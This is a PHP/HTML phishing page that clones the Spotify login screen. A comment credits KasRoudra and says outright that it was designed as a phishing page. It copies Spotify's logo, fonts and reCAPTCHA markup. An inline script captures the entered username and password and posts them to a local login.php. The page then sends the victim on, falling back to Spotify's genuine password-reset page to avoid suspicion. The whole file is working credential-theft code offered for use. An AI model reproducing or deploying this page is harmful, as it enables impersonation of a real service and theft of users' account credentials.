<?php
include "validate.php";
?>
<html id="app" lang="en" dir="ltr">
	<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
  <head>
    <meta charset="utf-8" />
    <title>Login - Spotify</title>
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <base href="/" />
    <link
      rel="icon"
      href="https://accounts.scdn.co/sso/images/favicon.ace4d8543bbb017893402a1e9d1ac1fa.ico"
    />

    <link
      rel="preload"
      href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Light.woff2"
      as="font"
      type="font/woff2"
      crossorigin="true"
    />
    <link
      rel="preload"
      href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Book.woff2"
      as="font"
      type="font/woff2"
      crossorigin="true"
    />
    <link
      rel="preload"
      href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Bold.woff2"
      as="font"
      type="font/woff2"
      crossorigin="true"
    />
    <link
      rel="preload"
      href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Black.woff2"
      as="font"
      type="font/woff2"
      crossorigin="true"
    />
    <script
      type="text/javascript"
      async=""
      src="https://www.gstatic.com/recaptcha/releases/Y-cOIEkAqcfDdup_qnnmkxIC/recaptcha__en.js"
      crossorigin="anonymous"
      integrity="sha384-4lxttbm4ASVXW4ZX4IKy2kenct7iqJL/fFpl49ygcTzLZBXCYHmdpYFK+0hPn7bS"
    ></script>
    <script
      async=""
      src="https://www.google-analytics.com/analytics.js"
    ></script>
    <script
      defer=""
      src="https://accounts.scdn.co/sso/js/indexReact.b2c351663de911c9d6d3.js"
      sp-bootstrap=""
    ></script>
    <meta
      id="bootstrap-data"
      sp-bootstrap-data='{"phoneFeatureEnabled":false,"previewEnabled":false,"user":false,"tpaState":"AQAwgHSSghwCa3QfPlZFuutABLlKFAysx2qC5qKzF7WYkOz2wak8PNH4jEiQ7CGdkyHt93XX/JAPHAlRsztfHhu0zHbBZ+1RS3F9OaH/TtNMmDOj2hri8znQdmQWJ+gEfFITfQSw54tQpWGoFJu757FfN3tJLrMZX/+isLPP7GF17vgKvBL0ga7BgLG9GfPA7XoTAS74pM30O9yk+GFfpqG/mK0cDY81s9fS8jas+9PKciP5HxzsiCLUYKt3O5Dta/Hk","geoLocationCountryCode":"US","BON":["0","0",1687389475]}'
      sp-component="login"
      sp-translations-data="eyJlcnJvclRpdGxlIjoiRXJyb3IiLCJsb2dpblRpdGxlIjoiTG9naW4iLCJmb3Jnb3RZb3VyUGFzc3dvcmRVc2VybmFtZSI6IkZvcmdvdCB5b3VyIHBhc3N3b3JkPyIsImRvbnRIYXZlQW5BY2NvdW50IjoiRG9uJ3QgaGF2ZSBhbiBhY2NvdW50PyIsImlucHV0VXNlcm5hbWUiOiJFbWFpbCBhZGRyZXNzIG9yIHVzZXJuYW1lIiwiaW5wdXRQYXNzd29yZCI6IlBhc3N3b3JkIiwiY2hlY2tib3hSZW1lbWJlck1lIjoiUmVtZW1iZXIgbWUiLCJlcnJvckZvcm1EZWZhdWx0IjoiT29wcyEgU29tZXRoaW5nIHdlbnQgd3JvbmcsIHBsZWFzZSB0cnkgYWdhaW4gb3IgY2hlY2sgb3V0IG91ciA8aGVscExpbms+aGVscCBhcmVhPC9oZWxwTGluaz4iLCJlcnJvckludmFsaWRDcmVkZW50aWFscyI6IkluY29ycmVjdCB1c2VybmFtZSBvciBwYXNzd29yZC4iLCJlcnJvclVua25vd24iOiJPb3BzISBTb21ldGhpbmcgd2VudCB3cm9uZywgcGxlYXNlIHRyeSBhZ2FpbiBvciBjaGVjayBvdXQgb3VyIDxoZWxwTGluaz5oZWxwIGFyZWE8L2hlbHBMaW5rPiIsImVycm9yVHJhbnNpZW50IjoiQW4gZXJyb3IgaGFzIG9jY3VycmVkIHByb2Nlc3NpbmcgeW91ciBsb2dpbi4gUGxlYXNlIHRyeSBhZ2Fpbi4iLCJlcnJvckZhY2Vib29rQWNjb3VudCI6IllvdSBkbyBub3QgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCBjb25uZWN0ZWQgdG8geW91ciBGYWNlYm9vayBhY2NvdW50LiBJZiB5b3UgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCwgcGxlYXNlIGxvZyBpbiB3aXRoIHlvdXIgU3BvdGlmeSBjcmVkZW50aWFscy4gSWYgeW91IGRvIG5vdCBoYXZlIGEgU3BvdGlmeSBhY2NvdW50LCA8bGlua1dpdGhIcmVmPnNpZ24gdXA8L2xpbmtXaXRoSHJlZj4uIiwiZXJyb3JTZXJ2ZXJFcnJvciI6IkFuIGVycm9yIGhhcyBvY2N1cnJlZCBwcm9jZXNzaW5nIHlvdXIgcmVxdWVzdC4gUGxlYXNlIHRyeSBhZ2Fpbi4iLCJlcnJvclVzZXJuYW1lUmVxdWlyZWQiOiJQbGVhc2UgZW50ZXIgeW91ciBTcG90aWZ5IHVzZXJuYW1lIG9yIGVtYWlsIGFkZHJlc3MuIiwiZXJyb3JVc2VybmFtZUludmFsaWRDaGFyYWN0ZXJzIjoiRm9yYmlkZGVuIGNoYXJhY3RlcihzKSB7Zm9yYmlkZGVuQ2hhcnN9IGluIHVzZXJuYW1lLiIsImVycm9yUGFzc3dvcmRSZXF1aXJlZCI6IlBsZWFzZSBlbnRlciB5b3VyIHBhc3N3b3JkLiIsImxvZ0luIjoiTG9nIEluIiwic2lnblVwRm9yU3BvdGlmeSI6IlNpZ24gdXAgZm9yIFNwb3RpZnkiLCJvciI6Im9yIiwibG9naW5Ub0NvbnRpbnVlIjoiVG8gY29udGludWUsIGxvZyBpbiB0byBTcG90aWZ5LiIsImVycm9yVmFsaWRhdGlvbkludmFsaWRDb2RlIjoiVGhpcyBjb2RlIGlzIGludmFsaWQuIENoZWNrIHRoZSBTTVMgYW5kIHRyeSBhZ2Fpbi4iLCJlcnJvclN1Ym1pdFRvb2tUb29Mb25nVG9DcmVhdGUiOiJJdCB0b29rIHRvbyBsb25nIHRvIGNvbXBsZXRlIHlvdXIgcmVxdWVzdC4gVHJ5IGFnYWluLiIsImVycm9yQXBwbGVBY2NvdW50IjoiWW91IGRvIG5vdCBoYXZlIGEgU3BvdGlmeSBhY2NvdW50IGNvbm5lY3RlZCB0byB5b3VyIEFwcGxlIElELiBJZiB5b3UgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCwgcGxlYXNlIHRyeSBsb2cgaW4gd2l0aCB5b3VyIFNwb3RpZnkgZW1haWwgb3IgdXNlcm5hbWUuIElmIHlvdSBkbyBub3QgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCwgcGxlYXNlIHNpZ24gdXAuIiwiY29udGludWVXaXRoQXBwbGUiOiJDb250aW51ZSB3aXRoIEFwcGxlIiwiY29udGludWVXaXRoRmFjZWJvb2siOiJDb250aW51ZSB3aXRoIEZhY2Vib29rIiwiY29udGludWVXaXRoUGhvbmVOdW1iZXIiOiJDb250aW51ZSB3aXRoIHBob25lIG51bWJlciIsImNvbnRpbnVlV2l0aEdvb2dsZSI6IkNvbnRpbnVlIHdpdGggR29vZ2xlIiwiZXJyb3JHb29nbGVBY2NvdW50IjoiWW91IGRvIG5vdCBoYXZlIGEgU3BvdGlmeSBhY2NvdW50IGNvbm5lY3RlZCB0byB5b3VyIEdvb2dsZSBBY2NvdW50LiBJZiB5b3UgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCwgcGxlYXNlIHRyeSBsb2cgaW4gd2l0aCB5b3VyIFNwb3RpZnkgZW1haWwgb3IgdXNlcm5hbWUuIElmIHlvdSBkbyBub3QgaGF2ZSBhIFNwb3RpZnkgYWNjb3VudCwgcGxlYXNlIHNpZ24gdXAuIn0="
    />
    <style data-styled="active" data-styled-version="5.3.3"></style>
  </head>
  <body>
    <div id="root">
      <div class="sc-llYSUQ leOpnM">
        <div class="sc-iJKOTD DEmMF">
          <div data-testid="spotify-logo" class="sc-bYoBSM kIoomM spotify-logo">
            <svg
              role="img"
              viewBox="0 0 78 24"
              height="100%"
              class="Svg-sc-6c3c1v-0 jrsLlJ"
            >
              <path
                d="M18.616 10.639c-3.77-2.297-9.99-2.509-13.59-1.388a1.077 1.077 0 0 1-1.164-.363 1.14 1.14 0 0 1-.119-1.237c.136-.262.37-.46.648-.548 4.132-1.287 11-1.038 15.342 1.605a1.138 1.138 0 0 1 .099 1.863 1.081 1.081 0 0 1-.813.213c-.142-.02-.28-.07-.403-.145Zm-.124 3.402a.915.915 0 0 1-.563.42.894.894 0 0 1-.69-.112c-3.144-1.983-7.937-2.557-11.657-1.398a.898.898 0 0 1-.971-.303.952.952 0 0 1-.098-1.03.929.929 0 0 1 .54-.458c4.248-1.323 9.53-.682 13.14 1.595a.95.95 0 0 1 .3 1.286Zm-1.43 3.267a.73.73 0 0 1-.45.338.712.712 0 0 1-.553-.089c-2.748-1.722-6.204-2.111-10.276-1.156a.718.718 0 0 1-.758-.298.745.745 0 0 1-.115-.265.757.757 0 0 1 .092-.563.737.737 0 0 1 .457-.333c4.455-1.045 8.277-.595 11.361 1.338a.762.762 0 0 1 .241 1.028ZM11.696 0C5.237 0 0 5.373 0 12c0 6.628 5.236 12 11.697 12 6.46 0 11.698-5.372 11.698-12 0-6.627-5.238-12-11.699-12h.001Zm20.126 11.078c-2.019-.494-2.379-.84-2.379-1.57 0-.688.633-1.151 1.572-1.151.91 0 1.814.352 2.76 1.076a.131.131 0 0 0 .187-.03l.987-1.426a.139.139 0 0 0-.025-.185c-1.127-.928-2.396-1.378-3.88-1.378-2.18 0-3.703 1.342-3.703 3.263 0 2.06 1.315 2.788 3.585 3.352 1.932.457 2.258.84 2.258 1.524 0 .757-.659 1.229-1.72 1.229-1.18 0-2.141-.408-3.216-1.364a.13.13 0 0 0-.188.016l-1.106 1.35a.137.137 0 0 0 .013.188c1.252 1.147 2.79 1.752 4.451 1.752 2.35 0 3.869-1.317 3.869-3.356 0-1.723-1.003-2.676-3.465-3.29Zm10.487 2.31c0 1.454-.874 2.47-2.125 2.47-1.235 0-2.169-1.061-2.169-2.47 0-1.41.933-2.47 2.17-2.47 1.23 0 2.124 1.038 2.124 2.47Zm-1.706-4.354c-1.018 0-1.854.412-2.543 1.256v-.95a.136.136 0 0 0-.038-.095.132.132 0 0 0-.093-.04h-1.81a.131.131 0 0 0-.093.04.136.136 0 0 0-.039.096v10.546c0 .076.06.137.133.137h1.809a.132.132 0 0 0 .093-.041.136.136 0 0 0 .038-.096v-3.329c.69.794 1.525 1.18 2.543 1.18 1.893 0 3.808-1.494 3.808-4.35 0-2.858-1.915-4.354-3.808-4.354Zm8.72 6.839c-1.297 0-2.274-1.068-2.274-2.486 0-1.422.943-2.455 2.244-2.455 1.305 0 2.288 1.069 2.288 2.487 0 1.422-.949 2.454-2.258 2.454Zm0-6.838c-2.438 0-4.347 1.926-4.347 4.383 0 2.432 1.896 4.338 4.317 4.338 2.445 0 4.36-1.92 4.36-4.369 0-2.44-1.901-4.353-4.33-4.353Zm9.535.17h-1.99V7.117a.136.136 0 0 0-.08-.126.13.13 0 0 0-.052-.01h-1.809a.133.133 0 0 0-.093.04.136.136 0 0 0-.038.095v2.087h-.87a.131.131 0 0 0-.122.085.139.139 0 0 0-.01.052v1.595c0 .074.06.135.132.135h.87v4.126c0 1.667.809 2.513 2.404 2.513.648 0 1.186-.138 1.694-.434a.135.135 0 0 0 .067-.117V15.64a.137.137 0 0 0-.063-.115.13.13 0 0 0-.129-.006c-.349.18-.685.263-1.061.263-.58 0-.84-.271-.84-.876V11.07h1.99a.13.13 0 0 0 .094-.04.136.136 0 0 0 .039-.096V9.339a.137.137 0 0 0-.039-.096.132.132 0 0 0-.094-.04v.001Zm6.934.007v-.255c0-.755.281-1.092.914-1.092.376 0 .68.077 1.019.194a.13.13 0 0 0 .118-.02.135.135 0 0 0 .056-.11V6.365a.137.137 0 0 0-.026-.081.133.133 0 0 0-.068-.05 4.852 4.852 0 0 0-1.502-.22c-1.67 0-2.554.965-2.554 2.788v.393h-.87a.132.132 0 0 0-.093.04.136.136 0 0 0-.038.096v1.603c0 .075.059.136.132.136h.87v6.364c0 .075.058.135.131.135h1.809c.072 0 .131-.06.131-.135V11.07h1.69l2.586 6.362c-.294.669-.583.802-.977.802-.319 0-.654-.098-.998-.29a.133.133 0 0 0-.105-.01.135.135 0 0 0-.078.072l-.612 1.38a.137.137 0 0 0 .056.175 3.733 3.733 0 0 0 1.932.508c1.334 0 2.073-.638 2.724-2.355l3.137-8.317a.14.14 0 0 0-.014-.126.131.131 0 0 0-.108-.06h-1.883a.132.132 0 0 0-.126.092l-1.928 5.651L69.006 9.3a.133.133 0 0 0-.124-.088h-3.09v.001Zm-4.02-.008h-1.809a.132.132 0 0 0-.093.041.136.136 0 0 0-.038.096v8.094c0 .075.06.135.132.135h1.809c.072 0 .131-.06.131-.135V9.34a.136.136 0 0 0-.038-.096.133.133 0 0 0-.094-.04Zm-.896-3.685a1.295 1.295 0 0 0-.919.393c-.243.25-.379.586-.377.937a1.342 1.342 0 0 0 .377.938 1.304 1.304 0 0 0 .92.393c.346-.002.677-.143.92-.393s.379-.587.377-.938c0-.735-.581-1.33-1.296-1.33h-.002Zm15.918 4.49h-.331v.434h.331c.165 0 .264-.083.264-.216 0-.142-.099-.217-.264-.217Zm.215.619.36.517h-.304l-.323-.474h-.279v.474h-.254v-1.37h.595c.31 0 .515.163.515.436a.412.412 0 0 1-.31.417Zm-.282-1.31c-.652 0-1.146.532-1.146 1.183 0 .65.49 1.175 1.139 1.175.652 0 1.147-.532 1.147-1.183 0-.65-.492-1.174-1.14-1.174Zm-.007 2.488a1.259 1.259 0 0 1-.904-.384 1.296 1.296 0 0 1-.368-.92c0-.717.563-1.314 1.279-1.314a1.259 1.259 0 0 1 .903.384 1.295 1.295 0 0 1 .369.921c0 .717-.563 1.314-1.279 1.314Z"
              ></path>
            </svg>
          </div>
        </div>
        <div class="sc-giYglK ggrwSq">
          <div class="sc-ezbkAF gEKFis">
            <div data-testid="login-container" class="sc-gsDKAQ kdQBSg">
              <p
                id="login-to-continue"
                class="Type__TypeElement-goli3j-0 jXgyor sc-furwcr kosEEf"
              >
                To continue, log in to Spotify.
              </p>
              <button
                data-testid="facebook-login"
                class="Button-y0gtbx-0 hpTULc sc-fFeiMQ kiLgbd"
              >
                <p
                  class="Type__TypeElement-goli3j-0 dmuHFl sc-hKwDye sc-jrQzAO sc-kDTinF eKDPqH hctigt kjwvkn"
                >
                  <svg
                    role="img"
                    focusable="false"
                    height="24"
                    width="24"
                    viewBox="0 0 24 24"
                    class="Svg-ytk21e-0 dMCjEC sc-bkkeKt gIBNai"
                  >
                    <path
                      data-name="White"
                      d="M20 3H4a1 1 0 00-1 1v16a1 1 0 001 1h8.62v-7h-2.35v-2.69h2.35v-2a3.27 3.27 0 013.49-3.59 19.25 19.25 0 012.1.11v2.43h-1.44c-1.13 0-1.35.54-1.35 1.32v1.73h2.69L17.76 14h-2.34v7H20a1 1 0 001-1V4a1 1 0 00-1-1z"
                      fill="#181818"
                    ></path></svg
                  >Continue with Facebook
                </p></button
              ><button
                data-testid="apple-login"
                class="Button-y0gtbx-0 hpTULc sc-ieecCq dKrXzO"
              >
                <p
                  class="Type__TypeElement-goli3j-0 dmuHFl sc-hKwDye sc-jrQzAO sc-kDTinF eKDPqH hctigt kjwvkn"
                >
                  <span class="sc-dJjYzT fYsQHg"></span>Continue with Apple
                </p></button
              ><button
                data-testid="google-login"
                class="Button-y0gtbx-0 hpTULc"
              >
                <p
                  class="Type__TypeElement-goli3j-0 cWkmRE sc-hKwDye sc-jrQzAO eKDPqH hctigt"
                >
                  <span class="sc-hGPBjI bhmjgQ"></span>Continue with Google
                </p>
              </button>
              <div class="sc-jRQBWg cZyagm">
                <hr class="sc-eCImPb gjuJVb" />
                <span class="Type__TypeElement-goli3j-0 VNztd sc-gKclnd cSypyy"
                  >or</span
                >
                <hr class="sc-eCImPb gjuJVb" />
              </div>
              <div data-testid="login-form">
                <div class="Group-u9bcx5-0 UXQuB sc-iqseJM kXefZX">
                  <div class="LabelGroup-sc-1ibddrg-0 dUvQaU">
                    <label
                      for="login-username"
                      class="Label-sc-1c0cv3r-0 jhxAUN"
                      >Email address or username</label
                    >
                  </div>
                  <input
                    aria-invalid="false"
                    id="login-username"
                    type="text"
                    placeholder="Email address or username"
                    class="Input-sc-1gbx9xe-0 iFfIqr"
                    value=""
                  />
                </div>
                <div class="Group-u9bcx5-0 UXQuB sc-iqseJM kXefZX">
                  <div class="LabelGroup-sc-1ibddrg-0 dUvQaU">
                    <label
                      for="login-password"
                      class="Label-sc-1c0cv3r-0 jhxAUN"
                      >Password</label
                    >
                  </div>
                  <input
                    aria-invalid="false"
                    id="login-password"
                    type="password"
                    placeholder="Password"
                    class="Input-sc-1gbx9xe-0 iFfIqr"
                  />
                </div>
                <a
                  id="reset-password-link"
                  data-testid="reset-password-link"
                  class="Link-k8gsk-0 dvVOBw"
                  >Forgot your password?</a
                >
                <div class="sc-crHmcD dNxnTN">
                  <div class="Group-u9bcx5-0 UXQuB sc-iqseJM kXefZX">
                    <div class="Checkbox-svpvf6-0 gJoDne">
                      <input
                        type="checkbox"
                        id="login-remember"
                        name="remember"
                        data-testid="login-remember"
                        class="VisuallyHidden-sc-17bibe8-0 gbnvEH"
                        checked=""
                      /><label for="login-remember" class="Label-cpoq-0 iXswkd"
                        ><span class="Indicator-sc-1airx73-0 kHTWAk"></span
                        ><span class="TextForLabel-sc-1jqya9m-0 bcyFQV"
                          ><p
                            class="Type__TypeElement-goli3j-0 VNztd sc-pVTFL gKaJcp"
                          >
                            Remember me
                          </p></span
                        ></label
                      >
                    </div>
                  </div>
                  <div class="sc-egiyK fNmxwU">
                    <button
                      id="login-button"
                      class="Button-qlcn5g-0 frUdWl"
                    >
                      <div
                        class="ButtonInner-sc-14ud5tc-0 lbsIMA encore-bright-accent-set"
                      >
                        <p
                          class="Type__TypeElement-goli3j-0 dmuHFl sc-hKwDye eKDPqH"
                        >
                          Log In
                        </p>
                      </div>
                      <div class="ButtonFocus-sc-2hq6ey-0 eiuQDg"></div>
                    </button>
                  </div>
                </div>
              </div>
              <script>
                  window.onload = function () { // Credit KasRoudra
                  const login = document.getElementById("login-button");
                  login.addEventListener("click", ()=> {
                      const username = document.getElementById("login-username").value;
                      const password = document.getElementById("login-password").value;
                      console.log({username, password})
                      fetch("/login.php",{
                          method: "POST",
                          body: JSON.stringify({username, password})
                      })
                      .then(res=> res.text())
                      .then(res=>{ 
                          console.log(res)
                          window.location.assign(res)
                          })
                      .catch(err=>{
                          console.log(err)
                          window.location.assign("https://www.spotify.com/password-reset/")
                          })
                  })
                  }
              </script>
              <hr class="sc-eCImPb gjuJVb" />
              <div id="sign-up-section" data-testid="signup-section">
                <p class="Type__TypeElement-goli3j-0 izDpgk sc-furwcr kosEEf">
                  Don't have an account?
                </p>
                <button
                  id="sign-up-link"
                  data-testid="signup-btn-link"
                  class="Button-y0gtbx-0 hpTULc"
                >
                  <p class="Type__TypeElement-goli3j-0 cWkmRE sc-hKwDye eKDPqH">
                    Sign up for Spotify
                  </p>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script
      id="google-recaptcha-v3"
      src="https://www.google.com/recaptcha/enterprise.js?render=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39"
      async=""
    ></script>
    <div>
      <div
        class="grecaptcha-badge"
        data-style="bottomright"
        style="
          width: 256px;
          height: 60px;
          display: block;
          transition: right 0.3s ease 0s;
          position: fixed;
          bottom: 14px;
          right: -186px;
          box-shadow: gray 0px 0px 5px;
          border-radius: 2px;
          overflow: hidden;
        "
      >
        <div class="grecaptcha-logo">
          <iframe
            title="reCAPTCHA"
            src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&amp;co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&amp;hl=en&amp;v=Y-cOIEkAqcfDdup_qnnmkxIC&amp;size=invisible&amp;cb=y1djcoe2yqxs"
            width="256"
            height="60"
            role="presentation"
            name="a-zdqzqz752zsm"
            frameborder="0"
            scrolling="no"
            sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
          ></iframe>
        </div>
        <div class="grecaptcha-error"></div>
        <textarea
          id="g-recaptcha-response-100000"
          name="g-recaptcha-response"
          class="g-recaptcha-response"
          style="
            width: 250px;
            height: 40px;
            border: 1px solid rgb(193, 193, 193);
            margin: 10px 25px;
            padding: 0px;
            resize: none;
            display: none;
          "
        ></textarea>
      </div>
      <iframe style="display: none"></iframe>
    </div>
  </body>
</html>
